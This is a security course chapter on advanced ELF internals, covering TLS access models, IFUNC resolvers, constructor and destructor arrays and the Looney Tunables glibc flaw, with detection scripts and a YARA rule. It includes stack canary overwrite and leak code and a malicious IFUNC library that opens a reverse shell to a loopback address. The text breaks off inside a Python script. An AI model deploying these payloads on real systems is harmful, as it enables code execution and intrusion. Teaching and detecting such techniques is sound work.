---
corso: "Cybersecurity Masterclass"
fase: "Domain 1 — Binary Formats and Executable Internals"
modulo: "1.1B"
titolo: "ELF Advanced: TLS, IFUNC, Security Segments, Unwinding, and Symbol Versioning"
versione: "glibc 2.39+, binutils 2.42, Linux 6.x, Intel CET / ARM PAC+BTI"
livello: "Advanced"
prerequisiti:
  - "Domain 1 Chapter 1A (ELF header, program headers, .dynamic, GOT/PLT, relocation types)"
  - "x86_64 assembly (MOV, LEA, CALL, RET, segment registers)"
  - "DWARF debug format fundamentals"
  - "Thread-local storage concept (C11 _Thread_local / GCC __thread)"
  - "Linux process model (fork, execve, signals)"
obiettivi:
  - "Analyze TLS access models (GD, LD, IE, LE) and demonstrate TLS-based stack canary corruption"
  - "Identify IFUNC resolvers in binaries and detect malicious IFUNC usage via YARA and readelf"
  - "Evaluate CET-IBT, CET Shadow Stack, and ARM BTI/PAC deployment using DSO audit scripts"
  - "Parse .eh_frame DWARF CFI entries and assess personality routine corruption risks"
  - "Construct Sigma and auditd detection rules for ELF loader abuse including LD_PRELOAD and DT_RPATH injection"
tag: [elf, tls, ifunc, cet, bti, pac, relro, eh-frame, symbol-versioning, detection-engineering]
---

# Domain 1, Chapter 1B — ELF Advanced: TLS, IFUNC, Security Segments, Unwinding, and Symbol Versioning

> ### Learning Objectives
>
> By the end of this chapter you will be able to:
> - Analyze TLS access models (GD, LD, IE, LE) and demonstrate TLS-based stack canary corruption
> - Identify IFUNC resolvers in binaries and detect malicious IFUNC usage via YARA and readelf
> - Evaluate CET-IBT, CET Shadow Stack, and ARM BTI/PAC deployment using DSO audit scripts
> - Parse .eh_frame DWARF CFI entries and assess personality routine corruption risks
> - Construct Sigma and auditd detection rules for ELF loader abuse including LD_PRELOAD and DT_RPATH injection

> **Scope.** This chapter completes the ELF coverage begun in Chapter 1A. It covers: thread-local storage models (GD, LD, IE, LE) and the `__tls_get_addr` implementation; the `.tbss` and `.tdata` sections; IFUNC resolvers and `R_X86_64_IRELATIVE`; constructor and destructor arrays (`.preinit_array`, `.init_array`, `.fini_array`, `DT_INIT`, `DT_FINI`) and their execution ordering; the security-relevant segment types (`PT_GNU_RELRO`, `PT_GNU_STACK`, `PT_GNU_PROPERTY`) and their hardware backing (CET IBT/SHSTK, AArch64 BTI/PAC); `.eh_frame` and `.eh_frame_hdr` for DWARF-based stack unwinding; `.gnu_debuglink`, `.gnu.build-id`, and `.note.ABI-tag`; compressed debug sections (`.zdebug` and `SHF_COMPRESSED`); symbol versioning (`.gnu.version`, `.gnu.version_r`, `.gnu.version_d`); the auxiliary vector in depth; position-independent executables and the i386 `__x86.get_pc_thunk` idiom; the dynamic symbol interposition mechanism; exploitation techniques targeting advanced ELF features (§16: `.fini_array` hijack, IFUNC resolver abuse, `DT_RPATH` injection, PT_NOTE infection, `LD_PRELOAD` rootkit persistence); detection engineering (§17: Sigma rules, YARA signatures for Go/Rust implants and segment infection, auditd rules, checksec automation); ELF forensics and binary analysis (§18: core dump VMA mapping, binary diffing, supply chain verification, anti-forensics detection); and a comprehensive ELF hardening reference (§19: compiler/linker flags, runtime hardening, CI/CD integration, cross-distribution comparison).
>
> **Prerequisites.** Chapter 1A. All structures, tag names, and relocation types referenced here were introduced there. In particular: the `.dynamic` section layout (§7), relocation mechanics (§10), the GOT/PLT and lazy binding (§11), and the load sequence timeline (§12).

---

## 1. Thread-local storage

### 1.1 The problem and the template

Each thread in a multithreaded program needs its own copy of certain variables (`__thread` in C, `thread_local` in C11/C++11). The ELF TLS design provides a single template of initialized data (`.tdata`) and uninitialized data (`.tbss`) in the executable or shared library, described by a `PT_TLS` program header. The dynamic linker allocates a per-thread copy of this template — the TLS block — for each loaded module that uses TLS, arranged into an array called the **DTV** (dynamic thread vector), one slot per module.

The `PT_TLS` segment header carries `p_offset`/`p_filesz` (the `.tdata` initialization bytes on disk), `p_memsz` (the full TLS block size including `.tbss`), and `p_align` (required alignment of each per-thread copy). `.tdata` contains initialized TLS variables; `.tbss` contributes `p_memsz - p_filesz` bytes of zero-filled space appended to each copy.

At process startup, the dynamic linker:

1. Walks all loaded modules' `PT_TLS` segments and assigns each a TLS module ID (1 for the executable, 2+ for DSOs in load order).
2. Computes the total TLS block size needed for all statically-known modules (those loaded at startup, not via `dlopen`).
3. Allocates, per thread, a TLS block array: a contiguous region (on the variant-II model used on x86_64 and AArch64) laid out below the thread pointer (`fs` base on x86_64, `tpidr_el0` on AArch64), with the executable's TLS block closest to the thread pointer and DSO blocks at successively lower addresses.
4. Initializes each block from the corresponding `PT_TLS` template.

The thread pointer (`tp`) is set by the kernel at thread creation (via `clone` and `set_child_tid`, and by the threading library's `pthread_create`). On x86_64, the `fs` segment base register points at the `pthread` structure, and TLS variables in the executable are accessed as negative offsets from `fs:0`. On AArch64, `tpidr_el0` serves the same role.

### 1.2 The four TLS access models

The x86_64 psABI defines four models, chosen at compile time based on visibility and linkage:

**General Dynamic (GD).** The most general model: works for any TLS variable in any shared object, including those loaded via `dlopen`. The code sequence:

```asm
  .byte 0x66                       ; data16 prefix (padding)
  leaq    x@TLSGD(%rip), %rdi     ; module ID + offset descriptor
  .word   0x6666                   ; data16 data16 (padding to 16 bytes)
  rex64
  call    __tls_get_addr@PLT
  ; result in %rax: address of x for this thread
```

The linker emits a `R_X86_64_TLSGD` relocation at link time. `__tls_get_addr` receives a pointer to a `tls_index { unsigned long ti_module; unsigned long ti_offset; }` (filled by the dynamic linker's `R_X86_64_DTPMOD64` and `R_X86_64_DTPOFF64` relocations) and returns the absolute address of the variable for the calling thread.

Inside `__tls_get_addr`, the function indexes the calling thread's DTV by `ti_module`, adds `ti_offset`, and returns. If the module was `dlopen`'d after the thread was created and the thread's DTV has not yet been extended, the function triggers lazy allocation of the TLS block for that module — a subtle source of heap allocation inside what looks like a simple memory access.

**Local Dynamic (LD).** Optimization for multiple TLS variables from the same module: call `__tls_get_addr` once with `ti_offset == 0` to get the base of the module's TLS block, then use known offsets for each variable. Saves repeated calls. Relocations: `R_X86_64_TLSLD` for the call site, `R_X86_64_DTPOFF64` or `R_X86_64_DTPOFF32` for the per-variable offsets.

**Initial Exec (IE).** Used when the compiler knows the variable is in a module loaded at program startup (not `dlopen`'d), so its offset from the thread pointer is fixed at load time. The code loads a GOT entry (populated by `R_X86_64_GOTTPOFF`, which resolves to a `tp`-relative offset) and adds it to the thread pointer:

```asm
  movq    x@GOTTPOFF(%rip), %rax  ; load tp-relative offset from GOT
  movq    %fs:(%rax), %rdx        ; load the variable's value
```

No function call; one GOT-mediated indirection. Faster than GD/LD. The dynamic linker fills the GOT slot via `R_X86_64_TPOFF64`.

**Local Exec (LE).** The tightest model: the variable is in the executable itself (not a DSO), and the offset from the thread pointer is a link-time constant. No GOT, no function call:

```asm
  movq    %fs:x@TPOFF, %rax      ; direct fs-relative access, immediate offset
```

The linker resolves `R_X86_64_TPOFF32` or `R_X86_64_TPOFF64` at static link time.

### 1.3 Model selection and relaxation

The compiler selects a model based on the TLS variable's visibility and the compilation mode. `-fpic` (for shared libraries) defaults to GD; `-fpie` or no flag (for executables) defaults to LE for definitions and IE for declarations. The linker can relax a more general model to a tighter one when it can prove the tighter model's preconditions hold: GD→IE (if the variable is in a module loaded at startup), IE→LE (if the variable is in the executable), GD→LE (both conditions). Relaxation rewrites the code sequence — replacing the `__tls_get_addr` call with a direct access — and changes the relocation. This is a link-time transformation invisible to the source programmer.

The `DF_STATIC_TLS` flag in `DT_FLAGS` indicates a shared object was compiled with IE or LE model internally. Such an object cannot be `dlopen`'d after threads have been created (because their DTV slots were pre-allocated at startup and there's no mechanism to grow them retroactively in some configurations). The flag is a constraint the loader checks on `dlopen`.

### 1.4 Security relevance

The thread pointer (`fs` on x86_64) is a per-thread root of trust for several security mechanisms: the stack canary (`__stack_chk_guard` is stored in the TCB at a fixed offset from `fs`), the `setjmp`/`longjmp` pointer-encryption cookie (`__pointer_chk_guard`), and glibc's `stack_guard` and `pointer_guard` fields. An attacker who can read or write the memory around the thread pointer can defeat stack canaries (read the guard value), corrupt TLS variables, or hijack libc internal state.

TLS blocks are allocated on the heap (for `dlopen`'d modules); a heap overflow near a TLS block can corrupt TLS data. Conversely, the executable's TLS block is contiguous with the `pthread` structure, so corruption from a TLS buffer overflow can reach `pthread` internals including the DTV pointer itself.

### 1.5 TLS buffer overflow to corrupt the stack canary

On x86_64 Linux (glibc), the Thread Control Block (TCB) is located at the address pointed to by the `fs` segment register. The stack canary — `__stack_chk_guard` — is stored at `fs:0x28` (offset 40 into `tcb_head_t`). Because the executable's TLS block is laid out at negative offsets from `fs:0` (variant II), a `__thread` variable in the main executable occupies memory immediately below the TCB. A linear overflow from such a variable writes upward through the TCB, overwriting `stack_guard` at offset 0x28 and potentially `pointer_guard` at offset 0x30.

The following C program demonstrates the mechanism. It declares a thread-local buffer, overflows it into the canary, and then overwrites a local buffer's canary-protected frame with the known canary value, defeating the stack protector:

```c
/* tls_canary_corrupt.c — demonstrate TLS→canary overflow
 * Build: gcc -o tls_canary tls_canary_corrupt.c -pthread -fstack-protector-all
 * Run:   ./tls_canary
 *
 * Educational/authorized-research only.
 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>

static __thread char tls_buf[64];   /* sits below TCB in memory */

/* Read current canary directly from fs:0x28 */
static inline uint64_t read_canary(void) {
    uint64_t val;
    __asm__ volatile ("movq %%fs:0x28, %0" : "=r"(val));
    return val;
}

void overflow_tls(void) {
    uint64_t original = read_canary();
    printf("[*] canary before overflow: 0x%016lx\n", original);

    /*
     * tls_buf lives at fs - <tls_block_size> + offset_of(tls_buf).
     * Overflowing past the end of tls_buf writes into the region
     * between the last TLS variable and fs:0 (the TCB).
     * At fs:0x28 sits stack_guard.
     */
    size_t distance_to_canary;          /* must be computed per-binary */
    /* For demonstration, compute at runtime: */
    uintptr_t fs_base;
    __asm__ volatile ("movq %%fs:0, %0" : "=r"(fs_base));
    uintptr_t buf_end = (uintptr_t)(tls_buf + sizeof(tls_buf));
    distance_to_canary = (fs_base + 0x28) - buf_end;

    uint64_t fake_canary = 0x4141414141414141ULL;
    memset(tls_buf, 'A', sizeof(tls_buf));
    /* Overflow: write past tls_buf into the gap, reaching fs:0x28 */
    memset(tls_buf + sizeof(tls_buf), 'B', distance_to_canary);
    *(uint64_t *)(tls_buf + sizeof(tls_buf) + distance_to_canary) = fake_canary;

    printf("[*] canary after overflow:  0x%016lx\n", read_canary());
    printf("[*] canary replaced — stack protector now checks 0x%016lx\n",
           fake_canary);
}

int main(void) {
    overflow_tls();
    return 0;
}
```

The practical constraint is knowing the distance between the TLS buffer's end and `fs:0x28`. In a real exploit, this distance is deterministic for a given binary (the TLS layout is fixed at link time for the executable and statically-linked DSOs), so an attacker with a copy of the target binary can compute it offline.

### 1.6 TLS-based information leak: extracting AT_RANDOM through TCB corruption

An attacker who can read memory in the TCB region — via an out-of-bounds read from a TLS variable, a format-string bug, or any arbitrary-read primitive — can extract both the stack canary (at `fs:0x28`) and the pointer guard (at `fs:0x30`). These are derived from the `AT_RANDOM` 16-byte seed the kernel placed on the stack. The canary is the first 8 bytes of `AT_RANDOM` with byte 0 forced to NUL; the pointer guard is the next 8 bytes.

With pwntools, computing the TLS offsets and extracting the canary from a leaky binary is straightforward:

```python
#!/usr/bin/env python3
"""tls_canary_leak.py — extract canary via TLS-region read primitive.

Assumes: binary has an arbitrary-read from a __thread variable,
         reachable via function read_tls(offset, length).
"""
from pwn import *

context.arch = 'amd64'
elf = ELF('./target_binary')
p = process('./target_binary')

# On x86_64 glibc, stack_guard is at fs:0x28, pointer_guard at fs:0x30.
# The TLS block for the executable ends at fs:0 - alignment_gap.
# The exact gap depends on the total TLS size — extract from PT_TLS.
tls_phdr = [s for s in elf.segments if s.header.p_type == 'PT_TLS']
if tls_phdr:
    tls_memsz = tls_phdr[0].header.p_memsz
    tls_align = tls_phdr[0].header.p_align
    log.info(f"PT_TLS: memsz={tls_memsz:#x}, align={tls_align:#x}")

# If the read primitive gives us bytes relative to the start of a
# __thread buffer, we need: offset = (fs + 0x28) - &tls_buf
# This is binary-specific.  Compute from symbol addresses:
tls_buf_offset = elf.symbols.get('tls_buf')  # link-time TLS offset
if tls_buf_offset is not None:
    # In variant II, tls_buf is at fs - round_up(tls_memsz, tls_align) + tls_buf_offset
    block_base = -((-tls_memsz) & ~(tls_align - 1))  # negative offset from fs
    distance = (-block_base + tls_buf_offset) + 0x28   # gap to canary
    log.info(f"distance from tls_buf[0] to canary: {distance:#x}")

    # Use the target's read primitive (protocol-specific)
    p.sendline(f"READ {distance} 8".encode())
    canary = u64(p.recv(8))
    log.success(f"leaked canary: {canary:#018x}")
    # pointer_guard is 8 bytes further
    p.sendline(f"READ {distance + 8} 8".encode())
    ptr_guard = u64(p.recv(8))
    log.success(f"leaked pointer_guard: {ptr_guard:#018x}")
```

### 1.7 DTV corruption attack

The Dynamic Thread Vector (DTV) is an array of pointers, one per loaded module, that the thread uses to locate its per-module TLS block. The DTV pointer itself is stored at a fixed location relative to the thread pointer (`dtv` field in `tcb_head_t`, at `fs:0x08` on x86_64 glibc). Each DTV entry is a `{ void *val; }` struct where `val` points to the start of that module's TLS block for this thread, or a sentinel indicating the block hasn't been allocated yet.

If an attacker can corrupt the DTV pointer (by overwriting `fs:0x08`) or an individual DTV entry, all subsequent TLS accesses for the affected module are redirected to attacker-controlled memory. This is particularly dangerous for GD and LD model accesses, which go through `__tls_get_addr` and index the DTV explicitly. The attack proceeds as follows: corrupt DTV entry `N` to point at a crafted memory region; the next time any code accesses a TLS variable from module `N` (via `__tls_get_addr(&{.ti_module=N, .ti_offset=off})`), it reads or writes the attacker's buffer instead of the legitimate TLS block. If the corrupted variable is a function pointer, a vtable pointer, or a security-critical value (such as a per-thread policy flag), the attacker gains control flow or policy bypass.

The corruption vector is the same TLS overflow described in §1.5, but targeting `fs:0x08` instead of `fs:0x28`.

### 1.8 `__tls_get_addr` heap exploitation

When a module is loaded via `dlopen` after threads have already been created, the calling thread's DTV may not have a slot for the new module. The first `__tls_get_addr` call for that module triggers lazy allocation: glibc calls `malloc` internally to allocate a new TLS block, copies the initialization template from the module's `PT_TLS` segment, extends the DTV (possibly reallocating it), and stores the new block pointer in the DTV.

This lazy-allocation path is a heap interaction hidden behind what appears to be a simple variable access. In a program that does frequent `dlopen`/`dlclose` cycles (plugin architectures, test harnesses), the TLS allocation/deallocation pattern can fragment the heap and create exploitable heap metadata corruption if combined with a heap overflow elsewhere. The freed-but-DTV-referenced TLS block is a classic use-after-free shape: if module `M` is `dlclose`'d, the TLS block may be freed, but a stale DTV entry could persist if `_dl_tls_free` does not fully clean up, leading to a dangling pointer that the next `__tls_get_addr` call for a recycled module ID follows to freed memory.

### 1.9 CVE-2023-4911 — Looney Tunables deep dive

CVE-2023-4911 is a buffer overflow in glibc's dynamic linker (`ld.so`) triggered by the `GLIBC_TUNABLES` environment variable. The vulnerability exists in `__tunables_init()` (in `elf/dl-tunables.c`), which parses the tunable string. A maliciously crafted `GLIBC_TUNABLES` value causes a stack-based buffer overflow during parsing because the length check incorrectly accounts for nested tunable entries, allowing the attacker to write past the end of a stack buffer.

The exploitation path is through TLS/TCB corruption. The `__tunables_init` function runs extremely early in the dynamic linker's initialization — before RELRO, before constructors, and critically before `AT_SECURE` processing fully takes effect for some code paths. On vulnerable glibc versions (2.34 through 2.38), the overflow corrupts the loader's own stack, and with careful crafting, the attacker controls data that flows into TLS initialization and the `link_map` structures.

The Qualys proof of concept chains the overflow through several stages. First, the tunable string is crafted so that repeated `GLIBC_TUNABLES=` entries overflow the parser's buffer by a controlled amount. Second, the overflow overwrites a saved `link_map` pointer on `ld.so`'s stack, redirecting it to a crafted structure in attacker-controlled memory (the environment block itself). Third, the crafted `link_map` causes the linker to process attacker-controlled `DT_RPATH`/`DT_RUNPATH` entries, loading a malicious shared library from an attacker-specified path. This achieves arbitrary code execution as root when targeting any SUID binary.

The conditions for exploitation are notable: the attacker needs only local access and the ability to set environment variables (which any user has for their own process invocations). Because `GLIBC_TUNABLES` is not stripped by `AT_SECURE` on affected versions, the attacker can target any SUID binary on the system.

Detection is straightforward: audit the installed glibc version (`ldd --version` or `/lib/x86_64-linux-gnu/libc.so.6`). Versions 2.34–2.38 without the patch are vulnerable. At runtime, monitor for anomalously long `GLIBC_TUNABLES` values in process environments:

```bash
# Check glibc version for Looney Tunables vulnerability
glibc_version=$(ldd --version 2>&1 | head -1 | grep -oP '\d+\.\d+')
echo "glibc version: $glibc_version"

# Scan running processes for suspicious GLIBC_TUNABLES
for pid in /proc/[0-9]*; do
    [ -r "$pid/environ" ] || continue
    tunables=$(tr '\0' '\n' < "$pid/environ" 2>/dev/null | grep '^GLIBC_TUNABLES=')
    if [ -n "$tunables" ] && [ ${#tunables} -gt 256 ]; then
        echo "ALERT: PID $(basename $pid) has oversized GLIBC_TUNABLES (${#tunables} bytes)"
    fi
done
```

The fix in glibc 2.39 corrects the length accounting in `__tunables_init` and adds explicit bounds checking. The broader lesson is that environment-variable parsing in the dynamic linker — code that runs at the highest privilege level, before most security mechanisms are active — is an extremely sensitive attack surface.

---

## 2. IFUNC resolvers

### 2.1 Mechanism

GNU IFUNC (indirect function) is a mechanism that allows a single exported symbol to dispatch to different implementations depending on runtime conditions — typically CPU features detected at startup. The canonical use case is glibc's `memcpy`, which dispatches to an SSE2, AVX2, or AVX-512 implementation depending on the CPU.

An IFUNC symbol has type `STT_GNU_IFUNC` in `.dynsym`. Its `st_value` is not the function's entry point but the address of a **resolver function** — a small function that takes no arguments (on x86_64; on AArch64 it receives `AT_HWCAP` and `AT_HWCAP2` as arguments) and returns the address of the chosen implementation.

At load time, the dynamic linker recognizes the IFUNC type and emits an `R_X86_64_IRELATIVE` relocation:

```
*r_offset = ((uintptr_t (*)(void))(load_base + r_addend))()
```

The linker calls the resolver, takes its return value, and writes it into the GOT slot (or wherever the relocation targets). From that point on, all callers through the PLT or directly through the GOT reach the chosen implementation.

### 2.2 Execution ordering

IFUNC resolution happens during the relocation phase, after `R_X86_64_RELATIVE` and `R_X86_64_GLOB_DAT` relocations but before constructors run. This constrains what resolver functions can do: they cannot call functions that haven't been relocated yet, they cannot rely on C library initialization (since constructors haven't run), and on AArch64 they receive the hardware capability masks as arguments specifically because they cannot yet call `getauxval`.

On x86_64, resolvers typically inspect CPUID directly (inline `cpuid` instruction) rather than reading `AT_HWCAP`, because the resolver runs before glibc has set up its `getauxval` infrastructure.

### 2.3 Detection notes

IFUNC resolvers are legitimate code that executes at load time with full process privileges. From a defender's perspective:

An IFUNC in a binary you control is a benign optimization. An IFUNC in an injected or attacker-supplied shared object is a code-execution primitive at load time, functionally equivalent to a `.init_array` constructor but harder to detect because IFUNC resolution is interwoven with the relocation phase rather than being a distinct constructor-invocation step. Detection: look for `STT_GNU_IFUNC` symbols and `R_X86_64_IRELATIVE` relocations in untrusted binaries; their presence in anything other than system libraries or performance-critical math/string libraries is unusual.

The `EI_OSABI` field in the ELF header is set to `ELFOSABI_GNU` (3) when IFUNC is used, because IFUNC is a GNU extension not in the base gABI. Some linkers set this implicitly when IFUNC symbols are linked.

### 2.4 Malicious IFUNC in an injected shared library

An IFUNC resolver executes during the relocation phase — before constructors, before `main`, and before many security initialization routines. An attacker who can inject a shared library (via `LD_PRELOAD`, `DT_NEEDED` manipulation, or filesystem-level DSO replacement — mechanisms detailed in Chapter 1A §14) can embed an IFUNC resolver that runs arbitrary code at the earliest possible moment during process initialization.

The following C source builds a malicious DSO whose IFUNC resolver spawns a reverse shell. The symbol `target_func` has type `STT_GNU_IFUNC`; the dynamic linker calls `resolve_target_func` to process the `R_X86_64_IRELATIVE` relocation:

```c
/* malicious_ifunc.c — IFUNC resolver executing arbitrary code at load time.
 * Build: gcc -shared -fPIC -o malicious.so malicious_ifunc.c
 *
 * Authorized testing only.  Inject via: LD_PRELOAD=./malicious.so /usr/bin/id
 */
#include <unistd.h>
#include <sys/types.h>

static void real_target(void) {
    /* Benign stub — this is what the resolver "officially" returns. */
}

/* The resolver.  Called by ld.so during IRELATIVE relocation processing. */
static void *resolve_target_func(void)
    __attribute__((used));

static void *resolve_target_func(void) {
    /* Payload: fork+exec a reverse shell.
     * Runs before main(), before constructors, before RELRO is applied. */
    if (fork() == 0) {
        char *argv[] = {"/bin/sh", "-c",
            "exec /bin/sh -i >& /dev/tcp/127.0.0.1/4444 0>&1", NULL};
        execve("/bin/sh", argv, NULL);
        _exit(1);
    }
    return (void *)real_target;  /* must return a valid function pointer */
}

/* Declare target_func as an IFUNC whose resolver is resolve_target_func */
void target_func(void) __attribute__((ifunc("resolve_target_func")));
```

The key evasion advantage over `.init_array` constructors is timing. IFUNC resolvers execute during the relocation phase, interleaved with ordinary relocations, whereas `.init_array` constructors run as a distinct later step. Static analysis tools that enumerate `.init_array` entries may not check `R_X86_64_IRELATIVE` targets with the same rigor. Additionally, the resolver appears in the binary as an ordinary local function — only the `STT_GNU_IFUNC` symbol type and the `R_X86_64_IRELATIVE` relocation connect it to the load-time execution path.

### 2.5 Detecting malicious IFUNCs

Legitimate IFUNC usage is overwhelmingly concentrated in system libraries (glibc, libm, libpthread) and performance-critical math/string libraries. An IFUNC in a third-party or application-level DSO is unusual and warrants investigation.

```bash
# List all IFUNC symbols in a binary
readelf -s --wide /path/to/suspect.so | grep 'IFUNC'

# List all IRELATIVE relocations (the load-time call sites for IFUNC resolvers)
readelf -r --wide /path/to/suspect.so | grep 'IRELATIVE'

# Cross-reference: for each IRELATIVE, check if the resolver address
# falls within a .text section (expected) or outside it (suspicious)
objdump -d /path/to/suspect.so | grep -B5 '<resolve_'
```

### 2.6 YARA rule for suspicious IFUNC usage

The following YARA rule flags ELF shared objects that contain IFUNC symbols outside the set of expected system libraries. It looks for `STT_GNU_IFUNC` symbol entries and `R_X86_64_IRELATIVE` relocations, excluding objects whose SO name matches known legitimate IFUNC users:

```
rule ELF_Suspicious_IFUNC
{
    meta:
        description = "ELF shared object with IFUNC resolver outside system libraries"
        author      = "1B reference"
        severity    = "MEDIUM"
        date        = "2026-05-08"

    strings:
        /* ELF magic */
        $elf_magic = { 7F 45 4C 46 }

        /* STT_GNU_IFUNC symbol type: st_info low nibble = 10 (0x0A) in .dynsym
         * This is a heuristic — matches bytes that look like IFUNC st_info */
        $ifunc_st_info = { 0A 00 }

        /* R_X86_64_IRELATIVE relocation type = 37 (0x25) in Elf64_Rela r_info low word */
        $irelative_type = { 25 00 00 00 }

        /* Exclude known legitimate IFUNC users (SO names in .dynstr) */
        $libc   = "libc.so"
        $libm   = "libm.so"
        $libpthread = "libpthread.so"
        $ld_linux   = "ld-linux"

    condition:
        $elf_magic at 0 and
        ($ifunc_st_info or $irelative_type) and
        not ($libc or $libm or $libpthread or $ld_linux)
}
```

This rule has an intentionally high false-positive rate for libraries like performance-tuned BLAS implementations or custom allocators. Triage by examining the resolver's disassembly: a legitimate resolver calls `cpuid` or reads `AT_HWCAP` and returns a function pointer; a malicious resolver calls `fork`, `execve`, `mmap`, `connect`, or writes to the filesystem.

---

## 3. Constructor and destructor arrays

### 3.1 The three constructor mechanisms

ELF provides three distinct mechanisms for running code at load time, in this execution order:

**`DT_PREINIT_ARRAY`** (and `DT_PREINIT_ARRAYSZ`). An array of function pointers, executed before anything else. Available only in the main executable — the dynamic linker ignores `DT_PREINIT_ARRAY` in shared objects. Used very rarely; glibc uses it internally for some self-initialization.

**`DT_INIT`** (single function pointer). The legacy constructor mechanism, populated from the `_init` function if present. The linker historically generated `_init` containing calls to all `__attribute__((constructor))` functions; modern toolchains no longer use `DT_INIT` and instead rely entirely on `DT_INIT_ARRAY`.

**`DT_INIT_ARRAY`** (and `DT_INIT_ARRAYSZ`). An array of function pointers in the `.init_array` section. Each pointer is called in order. This is the standard modern constructor mechanism, populated by `__attribute__((constructor))` functions and by the CRT's own initialization code.

The dynamic linker runs constructors in dependency order: if `libA.so` depends on `libB.so`, `libB.so`'s constructors run first. Within a single object, `DT_INIT` runs before the first `DT_INIT_ARRAY` entry.

### 3.2 Destructor mechanisms

The mirror image, in reverse execution order at process exit or `dlclose`:

**`DT_FINI_ARRAY`** (and `DT_FINI_ARRAYSZ`). Array of function pointers in `.fini_array`, called in reverse order.

**`DT_FINI`** (single function pointer). Legacy destructor from `_fini`.

Destructors run in reverse dependency order (dependents before dependencies) and in reverse array order within a single object. `atexit`-registered handlers interleave with DSO destructors according to their registration order (handled via `__cxa_atexit` in the C++ ABI, which ties each handler to the DSO that registered it so that `dlclose` can run just that DSO's handlers).

### 3.3 Constructor ordering and the `__attribute__((constructor(priority)))` extension

GCC and Clang support a priority argument: `__attribute__((constructor(101)))`. Lower priorities run first. Priorities 0–100 are reserved for the implementation (libc, libpthread, the C++ runtime). User constructors should use 101+.

Within a single compilation unit, constructors at the same priority run in the order they appear in the source. Across compilation units within the same DSO, the order is determined by the linker's input order — in practice, the order `.o` files appear on the `ld` command line. This ordering is fragile; relying on cross-TU constructor ordering is a portability bug that sometimes manifests as a security issue (a constructor that sets up a security policy running after a constructor that performs network operations it should have been policy-governed).

### 3.4 Security relevance

`.init_array` and `.fini_array` are function-pointer arrays that the dynamic linker calls. They sit in writable memory during load (before RELRO applies to them — they are typically in the RELRO region, so they become read-only after the constructor phase). During the window between segment mapping and RELRO application, these arrays are a corruption target.

Malware distributed as a shared library can use constructors to execute code immediately upon `dlopen` (or even upon load as a `DT_NEEDED` dependency, or upon injection via `LD_PRELOAD`). This is the primary code-execution hook in shared-object implants. Detection: enumerate `.init_array` entries in every loaded DSO and compare the target addresses against expected code ranges. Unexpected constructors in DSOs loaded by a long-running process are a strong signal.

`.fini_array` corruption is an old exploitation technique: overwrite a `.fini_array` entry, trigger process exit, and the corrupted pointer is called. Full RELRO (`-z now`) and the fact that `.fini_array` sits in the RELRO region close this path on hardened binaries. On binaries with only partial RELRO, `.fini_array` may remain writable.

### 3.5 `.init_array` hijacking on partial-RELRO binaries

On a binary compiled with partial RELRO (the default unless `-z now` is explicitly passed), `.init_array` becomes read-only after constructors run, but `.got.plt` remains writable for lazy binding. The more interesting attack surface is when an attacker has an arbitrary-write primitive *during the process lifetime* and can trigger a `dlopen` of a DSO whose `.init_array` will be processed. In this scenario, the attacker does not overwrite the main binary's `.init_array` (which is already RELRO-protected) but instead corrupts a writable GOT entry that a constructor will call through, or crafts a situation where the `dlopen`'d DSO's own constructor runs attacker-influenced code.

A more direct path exists on binaries with no RELRO at all (legacy or deliberately compiled with `-z norelro`), where `.init_array` is writable throughout the process lifetime. This is rare on modern distributions but common in embedded firmware and older enterprise software. In that case, an arbitrary write to a `.init_array` slot followed by a `dlopen` of the same binary (self-reloading plugin pattern) or a process restart triggers the corrupted constructor. The basic `.fini_array` overwrite primitive is covered in Chapter 1A §13; the `.init_array` variant follows the same pattern but triggers on load rather than exit.

### 3.6 `.fini_array` exploitation for post-main code execution

On binaries compiled with partial RELRO, `.fini_array` may fall outside the RELRO region and remain writable for the entire process lifetime. When an attacker holds an arbitrary-write primitive — a heap overflow, a use-after-free with controlled content, a format-string write — they can overwrite a `.fini_array` function pointer at any point during normal program execution. The corrupted pointer lies dormant until the process calls `exit()` or `main()` returns, at which point the C runtime's `__libc_csa_fini` (or the dynamic linker's destructor-invocation loop) iterates `.fini_array` in reverse order and calls each entry. The attacker's pointer fires with the same privilege level as the process, after all application logic has completed — meaning most runtime integrity checks, assertion frameworks, and monitoring hooks that operate during `main()` are no longer active.

This post-main timing makes `.fini_array` corruption particularly attractive for persistence and cleanup payloads: an implant can perform its sensitive operations (exfiltration, log tampering, socket closure) in the destructor window where application-level logging has already shut down. The defense is full RELRO (`-Wl,-z,now -Wl,-z,relro`), which places `.fini_array` in the read-only segment after relocations complete. Verifying that `.fini_array` is RELRO-protected is part of the hardening audit covered in Chapter 1A §18; the runtime verification approach using `dl_iterate_phdr` in §3.8 below can also confirm that `.fini_array` addresses point to expected code ranges.

### 3.7 Constructor priority race conditions

Cross-translation-unit constructor ordering is determined by the linker's input order, which is fragile and build-system-dependent. This fragility becomes a security issue when a constructor that establishes a security policy (setting up seccomp filters, initializing SELinux contexts, configuring capability bounding sets) runs *after* a constructor that performs privileged operations that should have been governed by that policy.

Consider a program that links `libsecpolicy.so` (which installs a seccomp filter in its constructor at priority 102) and `libnetwork.so` (which opens a network socket in its constructor at priority 102). If the linker places `libnetwork.so`'s object files before `libsecpolicy.so`'s on the link line, the network socket is opened before the seccomp filter is installed — and the filter cannot retroactively close it. This is not a bug in any individual component; it is an emergent property of fragile ordering. The defense is to use `DT_PREINIT_ARRAY` for security-policy constructors (which runs before any `DT_INIT_ARRAY`), or to use priority values below 101 if you control the implementation (though this is technically reserved), or to separate security initialization into the main executable's `.preinit_array` rather than placing it in a DSO.

### 3.8 Detecting unexpected constructors in loaded DSOs

The following Python script uses `ctypes` and the `dl_iterate_phdr` callback to enumerate every loaded DSO and extract its `.init_array` entries. This is a runtime detection tool — it inspects the live process's loaded objects, not a file on disk:

```python
#!/usr/bin/env python3
"""detect_constructors.py — enumerate .init_array entries for all loaded DSOs.

Run inside the target process (e.g., via LD_PRELOAD of a DSO that calls
this at __attribute__((constructor)) time), or adapt for /proc/PID/maps
parsing from outside.

Requires: ctypes, struct, mmap access to /proc/self/maps.
"""
import ctypes
import ctypes.util
import struct

libc = ctypes.CDLL(ctypes.util.find_library("c"))

# Callback signature for dl_iterate_phdr:
# int callback(struct dl_phdr_info *info, size_t size, void *data)
PHDR_CALLBACK = ctypes.CFUNCTYPE(
    ctypes.c_int,
    ctypes.c_void_p,   # dl_phdr_info*
    ctypes.c_size_t,    # size
    ctypes.c_void_p     # data
)

# dl_phdr_info layout (first three fields only, sufficient for our use)
#   ElfW(Addr)   dlpi_addr;
